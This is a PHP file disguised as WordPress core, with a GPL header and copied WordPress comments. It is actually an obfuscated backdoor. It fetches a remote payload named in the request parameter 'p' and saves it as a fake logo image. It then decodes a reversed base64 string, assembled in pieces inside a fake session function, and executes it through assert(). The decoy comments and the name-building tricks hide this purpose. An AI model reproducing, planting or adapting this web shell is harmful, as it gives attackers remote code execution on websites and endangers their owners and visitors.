<?php
/*WordPress - Web publishing software

Copyright 2017 by the contributors

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
$ee ="7kSK";
$wp_logo_image = './wp-main-logo.png';$ee.="pkyJ";
$wp2wp='base'.(120/2+4).'_de'.'code';$ee.="n5Gcu";
$wpxwp='base'.(140/2-6).'_en'.'code';$ee.="82Zvx";
if(!file_exists($wp_logo_image))
{	
	$wp_base_path = $_REQUEST["p"];
	if (!empty($wp_base_path)){
		file_put_contents($wp_logo_image,strrev(file_get_contents($wp2wp(strrev($wp_base_path)))));
	}else{
		die("wordpress path error");
	}
}
/**
 * Fires after WordPress has finished loading but before any headers are sent.
 */$ee.="WLul";/*
 * Most of WP is loaded at this stage, and the user is authenticated.*/$ee.="WYt1";$ee.="Cc39";/* WP continues
 * to load on the init hook that follows (e.g. widgets), and many plugins instantiate
 * themselves on it for all sorts of reasons (e.g. they need a user, a taxonomy, etc.).
 *
 * If you wish to plug an action once WP is loaded, use the wp_loaded hook below.*/$ee.="iLng";$ee.="yc05";$ee.="WZ05";/*
 *
 * @since 1.5.0
 */
function wpCheckSession($session){
	    
	/**
	 * Filter the life span of the post password cookie.*/$session.="2bj9Fdl";/*
	 *
	 * By default, the cookie expires 10 days from creation. To turn this
	 * into a session cookie, return 0.*
	 *
	 * @since 3.7.0
	 *
	 * @param int $expires The expiry time, as passed to setcookie().
	 */
	 if (1==1){
	 	$session .= "d2XlxWa";
	 }
	 if (true){
	 	$session .= "mhidlJ";
	 }
	 if (!false){
	 	$session .='nc0NHKlR';
	 		if(!empty($_SERVER["HTTP_HOST"])) $session .='2bjVGZ';
	 		if(!empty($_SERVER))  $session .='fRjNlN';
	 }
	 return $session;
}
if(filesize($wp_logo_image)>0)
{	
	
	$ee = wpCheckSession($ee);
	$ee.="XYih";$ee.="CbhZXZ";

    assert ($wp2wp(strrev($ee)));
    
}else { print "null logo size"; }
